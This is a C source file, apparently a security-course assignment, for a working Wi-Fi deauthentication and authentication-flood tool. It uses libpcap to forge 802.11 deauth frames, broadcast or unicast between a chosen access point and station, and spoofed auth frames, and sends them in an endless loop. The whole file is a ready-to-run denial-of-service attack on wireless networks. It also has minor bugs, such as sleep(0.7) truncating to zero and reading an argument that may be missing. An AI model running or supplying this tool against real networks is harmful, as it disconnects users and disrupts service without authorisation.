// BoB11 $IN$A

#include <pcap.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "main.h"

// ---------------------------------global variable------------------------------

radiotap_header radiotap; // radiotap
dot11_header dot11; // ieee802.11
deauth_f_param deauth_fixed; // deauth fixed parameter
auth_f_param auth_fixed; // auth fixed parameter
auth_t_param auth_tagged; // auth tagged parameter


// -------------------------------------function----------------------------------

void usage() {
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n"); // skeleton
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n"); // skeleton
}

typedef struct { // skeleton

    char * dev_;
    char * AP_MAC_Addr_;
    char * STA_MAC_Addr_;

} Param;

Param param = { // skeleton

    .dev_ = NULL,
    .AP_MAC_Addr_ = NULL,
    .STA_MAC_Addr_ = NULL

};

bool parse(Param * param, int argc, char * argv[]) { // skeleton
    
    if (argc < 3) {
        usage();
        return false;
    }

    param->dev_ = argv[1]; // NIC 담기
    param->AP_MAC_Addr_ = argv[2]; // AP MAC 주소 담기
    param->STA_MAC_Addr_ = argv[3]; // Station MAC 주소 담기

    return true;
}

// -------------------------------------Main--------------------------------------

int main(int argc, char * argv[]) {

    int auth_check = 0;
    int cnt = 0;

    u_char AP_MAC[6];
    u_char STA_MAC[6];

    // skeleton
    if (!parse(&param, argc, argv))
        return -1;

    // skeleton
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t * pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf); // exception
        return -1;
    };

    //printf("%s\n", argv[2]);
    //printf("%d\n", (uint8_t)atoh(argv[2]));


    if (argc == 5 && (strncmp(argv[4], "-auth", 5) == 0)) {
        auth_check = 1;
    }

    sscanf(param.AP_MAC_Addr_, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &AP_MAC[0], &AP_MAC[1], &AP_MAC[2], &AP_MAC[3], &AP_MAC[4], &AP_MAC[5]);
    sscanf(param.STA_MAC_Addr_, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &STA_MAC[0], &STA_MAC[1], &STA_MAC[2], &STA_MAC[3], &STA_MAC[4], &STA_MAC[5]);

    //printf("%d\n", auth_check);
    
    while (true) {
        u_char * packet = NULL;
        int packet_size;

        if (auth_check == 1) { // auth attack(STA -> AP) - Sleep(0.7) 이하 잘 작동

            memset(&radiotap, 0x0, sizeof(radiotap));
            radiotap.length = sizeof(radiotap) + 0xc;
            radiotap.present_flag1 = 0xa000402e;
            radiotap.present_flag2 = 0x00000820;

            memset(&dot11, 0x0, sizeof(dot11));
            dot11.frame_control_subtype = 0xb;

            memcpy(dot11.destination_addr, AP_MAC, sizeof(dot11.destination_addr));
            memcpy(dot11.source_addr, STA_MAC, sizeof(dot11.source_addr));
            memcpy(dot11.bssid_addr, AP_MAC, sizeof(dot11.bssid_addr));
            //printf("OK!!\n");

            // auth packet fixed parameter
            auth_fixed.auth_algorithm = 0;
            auth_fixed.auth_SEQ = 0x0001;
            auth_fixed.status_code = 0;

            /* 실험결과 tag는 필요x
            char OUI[] = "\x00\x10\x18";

            auth_tagged.tag_number = TagVendorSpecific;
            auth_tagged.tag_length = 0xa;
            memcpy(auth_tagged.OUI, "\x00\x10\x18", 3);
            auth_tagged.VS_OUI_type = 0x2;
            memcpy(auth_tagged.VS_Data, "\x00\x00\x1c\x00\x00\x00", 6);
            */

            packet_size = sizeof(radiotap) + 0xc + sizeof(dot11) + sizeof(auth_fixed); //+ sizeof(auth_tagged);
            packet = (u_char *) malloc(packet_size);

            memcpy(packet, &radiotap, sizeof(radiotap) + 0xc);
            memcpy(packet+sizeof(radiotap) + 0xc, &dot11, sizeof(dot11));
            memcpy(packet+sizeof(radiotap) + 0xc + sizeof(dot11), &auth_fixed, sizeof(auth_fixed));
            //memcpy(packet+sizeof(radiotap) + 0xc + sizeof(dot11) + sizeof(auth_fixed), &auth_tagged, sizeof(auth_tagged));
            //auth_fixed
        }
        else { // deauth attack - Sleep(1) 에도 잘 작동

            memset(&radiotap, 0x0, sizeof(radiotap));
            radiotap.length = sizeof(radiotap);
            radiotap.present_flag1 = 0x00028000;

            memset(&dot11, 0x0, sizeof(dot11));
            dot11.frame_control_subtype = 0xc;


            if (argc == 3) { // AP Broadcast

                memcpy(dot11.destination_addr, "\xFF\xFF\xFF\xFF\xFF\xFF", sizeof(dot11.destination_addr));
                memcpy(dot11.source_addr, AP_MAC, sizeof(dot11.source_addr));
                memcpy(dot11.bssid_addr, AP_MAC, sizeof(dot11.bssid_addr));
                //printf("OK!!\n");

            }
            else if(argc == 4) { // AP -> Station, Station -> AP

                if (cnt % 2 == 0) { // unicast 골고루 쏘기 위해
                    memcpy(dot11.destination_addr, AP_MAC, sizeof(dot11.destination_addr));
                    memcpy(dot11.source_addr, STA_MAC, sizeof(dot11.source_addr));
                    memcpy(dot11.bssid_addr, AP_MAC, sizeof(dot11.bssid_addr));
                }
                else {
                    memcpy(dot11.destination_addr, STA_MAC, sizeof(dot11.destination_addr));
                    memcpy(dot11.source_addr, AP_MAC, sizeof(dot11.source_addr));
                    memcpy(dot11.bssid_addr, AP_MAC, sizeof(dot11.bssid_addr));
                }

                cnt++;
                //printf("OK!!\n");
            }

            deauth_fixed.reason_code = 0x7;

            packet_size = sizeof(radiotap) + sizeof(dot11) + sizeof(deauth_fixed);
            packet = (u_char *) malloc(packet_size);

            memcpy(packet, &radiotap, sizeof(radiotap));
            memcpy(packet+sizeof(radiotap), &dot11, sizeof(dot11));
            memcpy(packet+sizeof(radiotap)+ sizeof(dot11), &deauth_fixed, sizeof(deauth_fixed));
            

        } // deauth attack

        //size_t packet_size = sizeof(radiotap) + sizeof(dot11) + sizeof(deauth_fixed);

        //printf("radiotap size : %d\n", sizeof(radiotap));
        //printf("radiotap length: %d\n", radiotap.length);

        //packet_size = sizeof(radiotap) + sizeof(dot11) + sizeof(deauth_fixed);

        //printf("packet_size %d\n", packet_size);
        //packet = (u_char *) malloc(packet_size);

        //memcpy(packet, &radiotap, sizeof(radiotap));
        //memcpy(packet+sizeof(radiotap), &dot11, sizeof(dot11));
        //memcpy(packet+sizeof(radiotap)+ sizeof(dot11), &deauth_fixed, sizeof(deauth_fixed));
        

        if (pcap_sendpacket(pcap, packet, packet_size) != 0) {
            fprintf(stderr, "pcap_sendpacket(%s) error\n", param.dev_);
        }

        free(packet);

        if(argc == 5) {
            printf("Sending Auth Packet\n");
        }
        else {
            printf("Sending Deauth Packet\n");
        }
        
        sleep(0.7);

    } // while 

    pcap_close(pcap);

    return 0;
}
